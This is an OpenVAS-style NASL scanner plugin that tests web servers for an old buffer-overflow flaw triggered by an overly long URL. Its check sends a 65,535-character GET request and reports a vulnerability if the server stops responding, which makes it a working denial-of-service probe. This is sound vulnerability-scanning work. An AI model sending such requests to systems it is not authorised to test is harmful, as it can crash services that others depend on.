# SPDX-FileCopyrightText: 2009 LSS
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.102004");
  script_version("2024-07-24T05:06:37+0000");
  script_tag(name:"last_modification", value:"2024-07-24 05:06:37 +0000 (Wed, 24 Jul 2024)");
  script_tag(name:"creation_date", value:"2009-06-23 09:27:52 +0200 (Tue, 23 Jun 2009)");
  script_cve_id("CVE-2000-0002", "CVE-2000-0065", "CVE-2000-0571", "CVE-2001-1250", "CVE-2003-0125",
                "CVE-2003-0833", "CVE-2006-1652", "CVE-2004-2299", "CVE-2002-1003", "CVE-2002-1012",
                "CVE-2002-1011", "CVE-2001-0836", "CVE-2005-1173", "CVE-2002-1905", "CVE-2002-1212",
                "CVE-2002-1120", "CVE-2000-0641", "CVE-2002-1166", "CVE-2002-0123", "CVE-2001-0820",
                "CVE-2002-2149");
  script_name("WWW Too Long URL DoS Vulnerability");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_category(ACT_DENIAL);
  script_family("Buffer overflow");
  script_copyright("Copyright (C) 2009 LSS");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade vulnerable web server to latest version.");

  script_tag(name:"summary", value:"Remote web server is vulnerable to the too long URL vulnerability. It might be
  possible to gain remote access using buffer overflow.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);
if(http_is_dead(port:port))exit(0);

#send a long url through the http port
req = string("/", crap(65535));
req = http_get(item:req, port:port);
http_send_recv(port:port, data:req);

#ret_code == 0, http up
#ret_code == 1, http down
ret_code = http_is_dead(port:port, retry:2);

if (ret_code == 1) {
  set_kb_item(name:"www/too_long_url_crash", value:TRUE);
  security_message(port:port);
  exit(0);
}

exit(99);
